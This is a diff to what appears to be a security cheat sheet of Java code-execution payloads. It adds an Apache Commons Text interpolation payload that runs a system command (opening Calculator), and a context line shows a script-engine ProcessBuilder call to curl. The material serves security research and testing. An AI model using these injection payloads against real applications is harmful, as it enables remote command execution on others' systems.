@@ -329,6 +329,11 @@ engine.eval("var x=new java.lang.ProcessBuilder; x.command(\"curl\",\"http://127
 - UNIXProcess/ProcessImpl
 
 ### Expression Language
+- Apache Common Text(prior to 1.10.0)
+```java
+StringSubstitutor interpolator = StringSubstitutor.createInterpolator();
+interpolator.replace("${script:js:java.lang.Runtime.getRuntime().exec(\"open -a Calculator\")}");
+```
 - SPEL
 ```java
 SpelExpressionParser parser = new SpelExpressionParser();
